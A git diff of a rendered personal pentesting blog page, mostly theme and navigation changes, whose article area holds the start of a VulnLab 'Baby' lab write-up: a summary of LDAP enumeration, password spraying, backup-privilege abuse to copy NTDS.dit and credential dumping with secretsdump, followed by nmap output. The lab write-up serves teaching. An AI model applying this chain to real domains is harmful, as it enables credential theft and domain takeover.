@@ -6,6 +6,8 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
+        <meta name="description" content="A blog about pentesting, security, and technology.">
+      
       
       
         <link rel="canonical" href="https://tomfieber.github.io/blog/2024/06/29/vulnlab-baby.html">
@@ -18,7 +20,7 @@
       
       
       <link rel="icon" href="../../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.7">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
     
     
       
@@ -26,7 +28,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/main.8608ea7d.min.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
       
         
         <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
@@ -73,7 +75,7 @@
       
         <meta  property="og:title"  content="VulnLab: Baby - My Personal Site" >
       
-        <meta  property="og:description"  content="None" >
+        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
       
         <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-baby.png" >
       
@@ -89,13 +91,22 @@
       
         <meta  name="twitter:title"  content="VulnLab: Baby - My Personal Site" >
       
-        <meta  name="twitter:description"  content="None" >
+        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
       
         <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-baby.png" >
       
     
     
-  </head>
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
   
   
     
@@ -105,7 +116,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="purple" data-md-color-accent="orange">
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -163,7 +174,7 @@
     
     
     
-    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="purple" data-md-color-accent="orange"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
     
       <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
@@ -173,7 +184,7 @@
     
     
     
-    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="purple" data-md-color-accent="orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
     
       <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
@@ -183,7 +194,7 @@
     
     
     
-    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="purple" data-md-color-accent="orange"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
     
       <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
@@ -198,11 +209,13 @@
     
     
     
-      <label class="md-header__button md-icon" for="__search">
-        
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
-      </label>
-      <div class="md-search" data-md-component="search" role="dialog">
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
     <form class="md-search__form" name="search">
@@ -234,13 +247,14 @@
     </div>
   </div>
 </div>
+      
     
     
       <div class="md-header__source">
         <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
   <div class="md-source__icon md-icon">
     
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
   </div>
   <div class="md-source__repository">
     tomfieber/tomfieber.github.io
@@ -260,13 +274,15 @@
   
   
   
+  
     <li class="md-tabs__item">
       <a href="../../../../index.html" class="md-tabs__link">
         
   
+  
     
   
-  Welcome to MkDocs
+  Home
 
       </a>
     </li>
@@ -277,11 +293,13 @@
   
   
   
+  
     
     
       <li class="md-tabs__item">
         <a href="../../../../about-me/index.html" class="md-tabs__link">
           
+  
   
     
   
@@ -296,6 +314,7 @@
         
   
   
+  
     
   
   
@@ -304,6 +323,7 @@
       <li class="md-tabs__item md-tabs__item--active">
         <a href="../../../index.html" class="md-tabs__link">
           
+  
   
     
   
@@ -319,11 +339,13 @@
   
   
   
+  
     
     
       <li class="md-tabs__item">
         <a href="../../../../references/index.html" class="md-tabs__link">
           
+  
   
     
   
@@ -378,7 +400,7 @@
       <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
   <div class="md-source__icon md-icon">
     
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
   </div>
   <div class="md-source__repository">
     tomfieber/tomfieber.github.io
@@ -398,8 +420,9 @@
       <a href="../../../../index.html" class="md-nav__link">
         
   
+  
   <span class="md-ellipsis">
-    Welcome to MkDocs
+    Home
     
   </span>
   
@@ -426,6 +449,7 @@
       
     
     
+    
       
       
     
@@ -437,10 +461,10 @@
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
-          
           <div class="md-nav__link md-nav__container">
             <a href="../../../../about-me/index.html" class="md-nav__link ">
               
+  
   
   <span class="md-ellipsis">
     About me
@@ -475,6 +499,7 @@
     <li class="md-nav__item">
       <a href="../../../../about-me/resume.html" class="md-nav__link">
         
+  
   
   <span class="md-ellipsis">
     Resume
@@ -516,6 +541,7 @@
       
     
     
+    
       
         
         
@@ -530,10 +556,10 @@
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-          
           <div class="md-nav__link md-nav__container">
             <a href="../../../index.html" class="md-nav__link ">
               
+  
   
   <span class="md-ellipsis">
     Blog
@@ -572,6 +598,7 @@
       
     
     
+    
       
       
     
@@ -585,6 +612,7 @@
           
           <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
             
+  
   
   <span class="md-ellipsis">
     Archive
@@ -613,6 +641,7 @@
     <li class="md-nav__item">
       <a href="../../../archive/2024.html" class="md-nav__link">
         
+  
   
   <span class="md-ellipsis">
     2024
@@ -651,6 +680,7 @@
       
     
     
+    
       
       
     
@@ -664,6 +694,7 @@
           
           <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
             
+  
   
   <span class="md-ellipsis">
     Categories
@@ -693,6 +724,7 @@
       <a href="../../../category/tryhackme.html" class="md-nav__link">
         
   
+  
   <span class="md-ellipsis">
     tryhackme
     
@@ -717,6 +749,7 @@
       <a href="../../../category/vulnlab.html" class="md-nav__link">
         
   
+  
   <span class="md-ellipsis">
     vulnlab
     
@@ -740,6 +773,7 @@
     <li class="md-nav__item">
       <a href="../../../category/writeups.html" class="md-nav__link">
         
+  
   
   <span class="md-ellipsis">
     writeups
@@ -787,6 +821,7 @@
       
     
     
+    
       
       
     
@@ -798,10 +833,10 @@
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
-          
           <div class="md-nav__link md-nav__container">
             <a href="../../../../references/index.html" class="md-nav__link ">
               
+  
   
   <span class="md-ellipsis">
     References
@@ -838,6 +873,9 @@
       
         
       
+        
+      
+    
     
     
       
@@ -853,6 +891,7 @@
           
           <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
             
+  
   
   <span class="md-ellipsis">
     Cheatsheets
@@ -885,6 +924,7 @@
       
     
     
+    
       
       
     
@@ -896,13 +936,13 @@
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" >
         
           
-          
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../references/cheatsheets/XSS/index.html" class="md-nav__link ">
+            <a href="../../../../references/cheatsheets/CORS/index.html" class="md-nav__link ">
               
   
+  
   <span class="md-ellipsis">
-    XSS
+    CORS
     
   </span>
   
@@ -914,10 +954,244 @@
         <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4_2_1">
             <span class="md-nav__icon md-icon"></span>
-            XSS
+            CORS
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_2" id="__nav_4_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection attacks
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Injection attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/NoSQL/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    NoSQL
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            NoSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/OS-command-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    OS command injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            OS command injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/SQL-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    SQL injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
               
             
           </ul>
@@ -949,8 +1223,7 @@
       
         
       
-        
-      
+    
     
     
       
@@ -966,6 +1239,7 @@
           
           <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
             
+  
   
   <span class="md-ellipsis">
     Methodologies
@@ -989,12 +1263,60 @@
   
   
   
-    <li class="md-nav__item">
-      <a href="../../../../references/methodologies/external-network-pentesting.html" class="md-nav__link">
+    
+    
+      
         
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3_1" id="__nav_4_3_1_label" tabindex="0">
+            
+  
   
   <span class="md-ellipsis">
-    External Network Pentest Methodology
+    Infrastructure
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Infrastructure
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../references/methodologies/infrastructure/external-network-pentesting.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    External Network Testing
     
   </span>
   
@@ -1012,8 +1334,9 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../references/methodologies/internal-network-pentesting.html" class="md-nav__link">
+      <a href="../../../../references/methodologies/infrastructure/internal-network-pentesting.html" class="md-nav__link">
         
+  
   
   <span class="md-ellipsis">
     Internal Network Pentesting
@@ -1027,6 +1350,59 @@
 
               
             
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3_2" id="__nav_4_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web apps
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Web apps
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
               
                 
   
@@ -1034,16 +1410,25 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../references/methodologies/web-app-pentesting.html" class="md-nav__link">
+      <a href="../../../../references/methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
         
   
+  
   <span class="md-ellipsis">
-    Web App Pentesting Methodology
+    OWASP WSTG
     
   </span>
   
 
       </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
     </li>
   
 
@@ -1255,448 +1640,439 @@
     </div>
     <article class="md-content__inner md-typeset">
       
-        
+        <!--
+  Copyright (c) 2016-2024 Martin Donath <martin.donath@squidfunk.com>
+
+  Permission is hereby granted, free of charge, to any person obtaining a copy
+  of this software and associated documentation files (the "Software"), to
+  deal in the Software without restriction, including without limitation the
+  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+  sell copies of the Software, and to permit persons to whom the Software is
+  furnished to do so, subject to the following conditions:
+
+  The above copyright notice and this permission notice shall be included in
+  all copies or substantial portions of the Software.
+
+  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+  FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
+  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+  IN THE SOFTWARE.
+-->
+
+<!-- Content -->
+<article class="md-content__inner md-typeset">
   
-
-
-  <nav class="md-tags" >
-    
-      
-      
-      
-        <span class="md-tag">backup</span>
-      
-    
-      
-      
-      
-        <span class="md-tag">ldap</span>
-      
-    
-      
-      
-      
-        <span class="md-tag">secretsdump</span>
-      
-    
-  </nav>
-
-
-  
-  
-
-
-<h1 id="vulnlab-baby">VulnLab: Baby</h1>
-<p><img alt="" src="../../../images/vulnlab_baby/baby.png" /></p>
+  <!-- Page content -->
+  <h1 id="vulnlab-baby">VulnLab: Baby<a class="headerlink" href="#vulnlab-baby" title="Permanent link">&para;</a></h1>
 <p>Baby is an <strong>EASY</strong> difficulty machine on <a href="https://wiki.vulnlab.com/guidance/easy/baby">VulnLab</a>. This machine involved performing LDAP enumeration to identify valid domain users and locate a plaintext password in one of the user description fields. By spraying that password across all the identified users, we find one that requires a password change, which once complete gives us an initial shell on the box. Once on the box, we discover that the current user has backup privileges, which allow us to create a copy of the drive and extract the NTDS.dit. That, along with the SAM and SYSTEM hives, allow us to dump all domain credentials with <code>secretsdump.py</code>. </p>
 <!-- more -->
-
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="nmap">Nmap</h3>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="go">PORT      STATE SERVICE       REASON          VERSION</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="go">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="go">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-21 11:52:19Z)</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="go">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="go">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="go">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="go">445/tcp   open  microsoft-ds? syn-ack ttl 127</span>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="go">464/tcp   open  kpasswd5?     syn-ack ttl 127</span>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="go">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="go">636/tcp   open  tcpwrapped    syn-ack ttl 127</span>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="go">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="go">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="go">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="go">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span>
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="go">| Issuer: commonName=BabyDC.baby.vl</span>
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="go">| Public Key type: rsa</span>
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="go">| Public Key bits: 2048</span>
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="go">| Signature Algorithm: sha256WithRSAEncryption</span>
-</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="go">| Not valid before: 2024-06-20T11:21:52</span>
-</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="go">| Not valid after:  2024-12-20T11:21:52</span>
-</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="go">| MD5:   1553:8e6f:d6f7:6a63:9c3e:fb81:d241:adb2</span>
-</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="go">| SHA-1: bc71:79c1:6c0c:ae2b:00f6:ec7f:7b4e:8dbf:31a0:c22e</span>
-</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="go">| -----BEGIN CERTIFICATE-----</span>
-</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="go">| MIIC4DCCAcigAwIBAgIQFcXuQwk5Mr5Iro4L87Y/gjANBgkqhkiG9w0BAQsFADAZ</span>
-</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="go">| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDA2MjAxMTIxNTJaFw0yNDEy</span>
